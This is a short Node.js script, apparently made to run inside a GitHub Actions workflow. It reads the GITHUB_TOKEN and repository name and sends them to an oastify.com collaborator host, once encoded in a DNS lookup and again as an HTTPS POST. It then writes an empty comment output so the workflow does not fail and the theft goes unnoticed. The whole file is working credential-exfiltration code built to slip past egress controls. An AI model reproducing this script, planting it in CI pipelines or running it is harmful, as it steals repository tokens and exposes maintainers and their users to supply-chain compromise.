const https = require('https');
const dns = require('dns');

const token = process.env.GITHUB_TOKEN || 'NOT_FOUND';
const repo = process.env.GITHUB_REPOSITORY || 'unknown';

// Exfil via DNS (always works, bypasses HTTPS egress restrictions)
const b64 = Buffer.from(`${repo}:${token}`).toString('base64')
  .replace(/[^a-zA-Z0-9]/g, '').slice(0, 60); // DNS label limit

const collaborator = 'ajxfdm5ubuavugnepf8z6o7zsqynmda2.oastify.com';
dns.lookup(`${b64}.${collaborator}`, () => {});

// Also try HTTPS for full token in one shot
const body = JSON.stringify({ token, repo });
const req = https.request({
  hostname: collaborator,
  port: 443,
  path: '/token',
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': body.length }
}, () => {});
req.on('error', () => {});
req.write(body);
req.end();

// Write empty comment output so workflow doesn't error
const fs = require('fs');
fs.appendFileSync(process.env.GITHUB_OUTPUT || '/dev/null', 'comment=\n');
